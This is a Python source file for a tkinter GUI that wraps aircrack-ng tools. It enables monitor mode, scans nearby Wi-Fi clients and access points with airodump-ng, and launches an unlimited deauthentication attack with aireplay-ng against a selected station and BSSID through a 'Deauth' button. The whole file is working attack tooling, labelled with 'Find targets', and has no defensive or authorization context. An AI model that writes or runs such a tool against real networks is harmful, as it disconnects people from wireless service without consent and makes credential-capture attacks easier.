import tkinter as tk
import threading
import subprocess
import csv
import time
from tkinter import ttk

global net_card
netcard = "wlo1"

class Application(tk.Frame):
    def __init__(self, master=None):
        super().__init__(master)
        self.master = master
        self.pack()
        self.create_widgets()

    def create_widgets(self):
    # create input boxes and button to filter captured data
        self.inputbox = tk.Frame(self)
        self.inputbox.pack(side="top", fill="x")
        
        self.clientlabel = tk.Label(self.inputbox, text="Station MAC:")
        self.clientlabel.pack(side="left", padx=5, pady=5)

        self.clientid = tk.Entry(self.inputbox)
        self.clientid.pack(side="left", padx=5, pady=5)

        self.bssidlabel = tk.Label(self.inputbox, text="BSSID:")
        self.bssidlabel.pack(side="left", padx=5, pady=5)
        
        self.bssid = tk.Entry(self.inputbox)
        self.bssid.pack(side="left", padx=5, pady=5)

        self.deauthbutton = tk.Button(self.inputbox, text="Deauth", command=lambda:self.deauth(self.clientid.get(), self.bssid.get()))
        self.deauthbutton.pack(side="left", padx=5, pady=5)

        # create button to start capturing
        self.start_button = tk.Button(self, text="Find targets", command=self.start_capture)
        self.start_button.pack(side="top")

        # create table to display captured data
        self.table = ttk.Treeview(self, columns=("Station MAC", "BSSID", "Probed ESSIDs"), show="headings")
        self.table.heading("Station MAC", text="Station MAC")
        self.table.heading("BSSID", text="BSSID")
        self.table.heading("Probed ESSIDs", text="Probed ESSIDs")
        self.table.pack(side="bottom", fill="both", expand=True)


    def start_capture(self):
        # create thread to run airodump-ng command
        self.thread = threading.Thread(target=self.run_airodump)
        self.thread.start()

    def run_airodump(self):
        self.start_button["state"] = "disabled"
        # run airodump-ng command for 10 seconds
        command = "sudo airodump-ng wlo1mon --write output"
        subprocess.Popen(command, shell=True)
        self.start_button['text'] = "Scanning..."
        time.sleep(10)
        subprocess.call(["sudo", "pkill", "airodump-ng"])

        # read the CSV file and parse the necessary data
        with open('output-01.csv', 'r') as file:
            reader = csv.reader(file)
            for i in reader:
                if i != []:
                    if i[0] != "Station MAC":
                        next(reader)
                    else:
                        break

            for i in reader:
                try:       
                    self.table.insert("", "end", values=(i[0], i[5], i[6] ))
                except IndexError:
                    pass
        subprocess.run(["rm", "-f", "output-01.csv", "output-01.cap", "output-01.kismet.csv", "output-01.kismet.netxml", "output-01.log.csv"])
        self.start_button['text'] = "Find targets"
        self.start_button["state"] = "normal";

    def deauth(self, client, ap):
        self.deauthbutton['state'] = "disabled"
        self.deauthbutton['text'] = "Running Deauth attack..."
        subprocess.run(["sudo", "aireplay-ng", "-D", "-0", "0", "-a", ap, "-c", client, netcard+"mon"])
        time.sleep(10)
        subprocess.call(["sudo", "pkill", "aireplay-ng"])
        self.deauthbutton['text'] = "Deauth"
        self.deauthbutton['state'] = "normal"

if __name__ == "__main__":
    subprocess.run(["sudo", "airmon-ng", "start", netcard])
    root = tk.Tk()
    app = Application(master=root)
    app.mainloop()
    subprocess.run(["sudo", "airmon-ng", "stop", netcard+"mon"])
